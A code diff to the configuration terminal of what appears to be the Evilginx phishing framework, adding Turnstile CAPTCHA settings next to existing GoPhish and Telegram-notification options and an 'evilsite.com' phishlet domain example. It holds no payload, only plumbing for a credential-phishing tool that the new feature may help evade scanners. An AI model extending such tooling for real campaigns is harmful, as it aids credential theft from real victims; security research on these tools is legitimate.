@@ -197,8 +197,13 @@ func (t *Terminal) handleConfig(args []string) error {
 			telegramEnabled = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "web_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), strconv.Itoa(t.cfg.general.WebPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatId(), telegramEnabled}
+		turnstileEnabled := "false"
+		if t.cfg.GetTurnstileEnabled() {
+			turnstileEnabled = "true"
+		}
+
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "web_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "turnstile site_key", "turnstile enabled"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), strconv.Itoa(t.cfg.general.WebPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatId(), telegramEnabled, t.cfg.GetTurnstileSiteKey(), turnstileEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -268,6 +273,21 @@ func (t *Terminal) handleConfig(args []string) error {
 					return nil
 				case "false":
 					t.cfg.SetTelegramEnabled(false)
+					return nil
+				}
+			}
+		case "turnstile":
+			switch args[1] {
+			case "site_key":
+				t.cfg.SetTurnstileSiteKey(args[2])
+				return nil
+			case "enabled":
+				switch args[2] {
+				case "true":
+					t.cfg.SetTurnstileEnabled(true)
+					return nil
+				case "false":
+					t.cfg.SetTurnstileEnabled(false)
 					return nil
 				}
 			}
@@ -1205,7 +1225,8 @@ func (t *Terminal) createHelp() {
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("web_port"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
-			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
+			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+			readline.PcItem("turnstile", readline.PcItem("site_key"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1222,6 +1243,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"telegram", "chat_id"}, "telegram chat_id <id>", "set up the chat id for telegram notifications")
 	h.AddSubCommand("config", []string{"telegram", "enabled"}, "telegram enabled <true|false>", "enable or disable telegram notifications")
 	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "test telegram notification")
+	h.AddSubCommand("config", []string{"turnstile", "site_key"}, "turnstile site_key <key>", "set up the site key for turnstile")
+	h.AddSubCommand("config", []string{"turnstile", "enabled"}, "turnstile enabled <true|false>", "enable or disable turnstile")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
